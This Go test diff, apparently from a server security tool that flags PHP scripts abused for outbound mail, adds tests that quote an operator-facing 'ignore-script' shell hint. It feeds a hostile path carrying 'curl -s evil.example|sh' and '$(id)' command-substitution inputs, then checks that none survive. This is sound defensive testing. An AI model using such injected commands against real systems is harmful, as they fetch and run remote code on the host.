@@ -104,7 +104,7 @@ func TestPath6_FiresWhenClientMailsFiveOutsideAddresses(t *testing.T) {
 		s.CPUser != "usera" || s.Message != "Bots use "+k+" to mail outside addresses" {
 		t.Fatalf("script finding = %+v", s)
 	}
-	for _, want := range []string{path6IP, "5 outside addresses through this script in 24h.", "captcha", "csm phprelay ignore-script " + k} {
+	for _, want := range []string{path6IP, "5 outside addresses through this script in 24h.", "captcha", "csm phprelay ignore-script '" + k + "'"} {
 		if !strings.Contains(s.Details, want) {
 			t.Errorf("script finding details miss %q:\n%s", want, s.Details)
 		}
@@ -537,4 +537,40 @@ func TestPath6_IgnoreCoversScriptVariants(t *testing.T) {
 		}
 		requireNoPath6(t, *findings)
 	})
+}
+
+// PATH_INFO is client text. The ignore-script hint an operator may paste
+// into a root shell must carry only the quoted script id.
+func TestPath6_ScriptHintCarriesOnlyQuotedScriptID(t *testing.T) {
+	p, findings := path6Pipeline(t, "a")
+	feedVictims(t, p, "a", path6Ajax+"/x;curl -s evil.example|sh", path6IP, 0, 5, path6T0)
+	scripts := path6Of(*findings, path6Script)
+	if len(scripts) != 1 {
+		t.Fatalf("script findings = %+v, want one", scripts)
+	}
+	s := scripts[0]
+	const hint = "csm phprelay ignore-script 'site-a.example:/wp-admin/admin-ajax.php'"
+	if !strings.HasSuffix(s.Details, hint) {
+		t.Fatalf("script details do not end with the quoted hint:\n%s", s.Details)
+	}
+	for _, f := range path6Of(*findings, path6Check) {
+		s.Message, s.Details = s.Message+f.Message+f.ScriptKey, s.Details+f.Details
+	}
+	for _, attacker := range []string{"curl", "evil", ";", "|", "/x"} {
+		if strings.Contains(s.Message+s.Details+s.ScriptKey+s.DedupKey, attacker) {
+			t.Fatalf("finding text carries client text %q:\n%s\n%s", attacker, s.Message, s.Details)
+		}
+	}
+}
+
+func TestShellQuote(t *testing.T) {
+	for in, want := range map[string]string{
+		"site-a.example:/index.php": `'site-a.example:/index.php'`,
+		"a'b":                       `'a'\''b'`,
+		"$(id) `id`":                `'$(id) ` + "`id`'",
+	} {
+		if got := shellQuote(in); got != want {
+			t.Errorf("shellQuote(%q) = %s, want %s", in, got, want)
+		}
+	}
 }
